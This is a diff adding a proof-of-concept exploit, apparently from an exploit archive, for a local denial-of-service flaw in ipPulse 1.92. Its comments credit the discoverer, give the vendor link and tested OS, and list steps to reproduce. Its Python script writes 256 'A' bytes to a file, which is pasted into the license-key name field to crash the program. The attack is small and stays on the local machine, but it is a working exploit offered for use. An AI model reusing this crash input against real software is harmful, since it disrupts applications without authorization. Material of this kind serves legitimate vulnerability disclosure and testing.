@@ -1,0 +1,22 @@
+# Exploit Title: ipPulse 1.92 - 'License Key' Denial of Service (PoC)
+# Discovery by: Shubham Singh
+# Known As: Spirited Wolf Twitter: @Pwsecspirit
+# Discovery Date: 2018-07-30
+# Vendor Homepage: https://www.netscantools.com/ippulseinfo.html
+# Software Link: http://download.netscantools.com/ipls192.zip
+# Tested Version: 1.92
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows xp Service pack3 x86 
+
+# Steps to Reproduce: 
+# Run the python exploit.py , Open exploit.txt and copy content.
+# Open ippulse.exe , Click On "Enter Key".
+# In the name field paste the content of "exploit.txt" and in Key type anything.
+# Press "OK" and B00m Crashed.
+
+#!/usr/bin/env python
+ 
+buffer = "\x41" * 256
+f = open ("exploit.txt", "w")
+f.write(buffer)
+f.close()
